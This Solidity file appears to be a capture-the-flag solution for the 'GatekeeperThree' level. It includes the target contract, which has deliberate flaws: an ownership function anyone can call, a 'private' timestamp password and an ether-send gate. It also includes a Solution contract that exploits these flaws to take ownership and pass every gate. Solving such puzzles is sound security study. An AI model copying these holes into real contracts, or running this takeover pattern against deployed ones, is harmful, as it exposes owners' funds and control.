// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor(address payable _target) {
    target = GatekeeperThree(_target);
  }

  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }

  function trickInit() public {
    trick = address(this);
  }

  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
    owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
      allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive() external payable {}
}

// before calling this contract callEnter function
// should transfer some ether to the GatekeeperThree contract
contract Solution {
  bool public couldEnter;
  address payable public gateKeeperAddr = payable(0xe6Cc348a30c2C9Bc31c87c9D126457fB88697976);

  function callEnter() public {
    // initialize the trick contract
    _createTrick();
    // set to true the GatekeeperThree contract allow_entrance
    _getAllowance();
    // set this contract as the GatekeeperThree owner
    _getOwnership();
    // try to pass the gates
    couldEnter = GatekeeperThree(gateKeeperAddr).enter();
  }

  function _getOwnership() private {
    GatekeeperThree(gateKeeperAddr).construct0r();
  }

  function _createTrick() private {
    GatekeeperThree(gateKeeperAddr).createTrick();
  }

  function _getAllowance() private {
    GatekeeperThree(gateKeeperAddr).getAllowance(block.timestamp);
  }
}
